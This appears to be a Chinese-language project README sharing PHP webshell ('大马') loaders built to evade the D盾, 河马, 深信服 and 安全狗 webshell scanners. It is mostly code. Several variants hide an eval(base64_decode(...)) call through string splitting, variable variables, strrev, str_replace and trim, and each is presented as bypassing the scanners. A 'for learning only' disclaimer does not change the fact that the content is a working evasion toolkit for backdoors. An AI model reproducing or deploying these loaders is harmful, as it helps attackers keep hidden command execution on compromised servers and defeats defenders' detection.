# S9MF-php-webshell-bypass
为方便WAF入库的项目 | 分享PHP免杀大马 | 菜是原罪 | 多姿势(假的就一个) 

## 前言
- - -
webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。又分大马和小马，大马就是功能比较多的，而小马更像一句话，本文介绍的是免杀PHP大马。  
![1](https://ws1.sinaimg.cn/large/006VEsyOgy1g0qmh8h5snj30aa096dgr.jpg)  

## 声明
* 项目脚本仅供学习交流请勿用于非法用途。
* 本文测试的免杀脚本，并不永久免杀，只要一入特征库，就凉了，更多的是思路。

## WAF
- - -
测试用的WAF

WAF |  下载
------------ |  ----------
 D盾_Web查杀  | http://www.d99net.net/down/d_safe_2.1.4.4.zip
 河马webshell查杀 |  http://dl.shellpub.com/hm-ui/latest/HmSetup.zip?version=1.5.0
深信服WebShellKillerTool | http://edr.sangfor.com.cn/tool/WebShellKillerTool.zip
网站安全狗网马查杀 | http://download.safedog.cn/download/software/safedogwzApache.exe
OpenRASP WEBDIR+检测引擎 | https://scanner.baidu.com

![2](https://ws1.sinaimg.cn/large/006VEsyOgy1g0qnshf8voj31400idwhz.jpg)
![3](https://ws1.sinaimg.cn/large/006VEsyOgy1g0qnsiq1zej314d0ijabt.jpg)
![4](https://ws1.sinaimg.cn/large/006VEsyOgy1g0qnw2hblng303c0370td.gif)

## Test
- - -
首先，我们的思路是以这段代码开始：
```php
<?php
$code = '大马源码base64加密';
eval(base64_decode($code));
?>
```
动图:
![5](https://ws1.sinaimg.cn/large/006VEsyOgy1g0qwjej1y0g30qd0hednu.gif)

waf查杀:  
![6](https://ws1.sinaimg.cn/large/006VEsyOgy1g0qwqzgr9dj30lg06omxe.jpg)

分割函数:
我们把base64_decode大小写分割成多个变量，再合并，并赋值给其他变量。
```php
<?php
$a = 'bAsE';
$b = '64_dEcODE';
$c = $a.$b;
$d = $c('code');
eval($d);
```

再用WAF查杀:  
D盾_Web查杀  
![7](https://ws1.sinaimg.cn/large/006VEsyOgy1g0r33tc306j30ng09vmyf.jpg)

河马webshell查杀  
![8](https://ws1.sinaimg.cn/large/006VEsyOgy1g0r362vy4bj30ly07l3yk.jpg)

深信服WebShellKillerTool  
![9](https://ws1.sinaimg.cn/large/006VEsyOgy1g0r36un7ijj30kk071t9r.jpg)

网站安全狗网马查杀  
![10](https://ws1.sinaimg.cn/large/006VEsyOgy1g0r384ykhrj30p006ngly.jpg)

至此绕过以上4个WAF查杀，但是上面那个例子虽然成功绕过了，但是看起来很简单，所以在写一个。  

首先我们来了解php中`$$`一个引用变量。  

```php
<?php
$a = 's9mf'; 
$b = $a;    
$c = "b";    
echo $$c;  
```
输出:  
![11](https://ws1.sinaimg.cn/large/006VEsyOgy1g0r4dm4xxej307y05kt8p.jpg)

利用`$$`和`""`双引号解释变量的特性，我们这样写  
### code1
```php
<?php
$a = 'bAsE';
$b = '64_dEcODE';
$fuck = $a.$b;
$d = "fuck";
$e = $$d('code');  // base64_decode('code')
eval($e); 
```
这个`payload`也是绕过以上4个WAF查杀。

## 更多免杀payload
 - - -
 >以下的code均可以绕过绕过安全狗、D盾和深信服的客户端Webshell查杀和河马正式版的查杀。  
 
 ### strrev()函数
 **strrev()** 函数反转字符串。  
 ```php
 <?php
echo strrev("s9mf");
 ```
 输出:  
 ![12](https://ws1.sinaimg.cn/large/006VEsyOgy1g0r4x9he8mj30cz056wez.jpg)  
 利用反转字符串的特性。  
 ### code2
 ```php
 <?php
$a = strrev('EdOcEd_46eSaB');  // base64_decode
$b= $a('code');
eval($b);
 ```
### str_replace()函数
**str_replace()** 函数替换字符串中的一些字符(区分大小写)
```
<?php
echo str_replace("ok","","emokmmokmokm"); 
```
输出:  
![13](https://ws1.sinaimg.cn/large/006VEsyOgy1g0r5hzfjzzj30fw05pmxr.jpg)  
### code3
```php
<?php
$c = str_replace("s9mf", "", "Bs9mfaSE6s9mf4_Decs9mfOdE"); // base64_decode
$a = $c('code');
eval($b=&$a); 
?>
```
### ltrim()和trim()函数
* ltrim() - 移除字符串左侧的空白字符或其他预定义字符
* trim() - 移除字符串两侧的空白字符或其他预定义字符
```php
<?php
echo ltrim('mmmNice','m')."<br/>";
echo trim('okiii','i');
```
输出:
![14](https://ws1.sinaimg.cn/large/006VEsyOgy1g0royxev5aj309u061t95.jpg)
依据这个特性。  
```php
<?php
$a = ltrim('mmmbAsE64_D','m');
$b = trim('ecODeiii','i');
$base = $a.$b;
$c = $base('code');
eval($d=&$c);
```





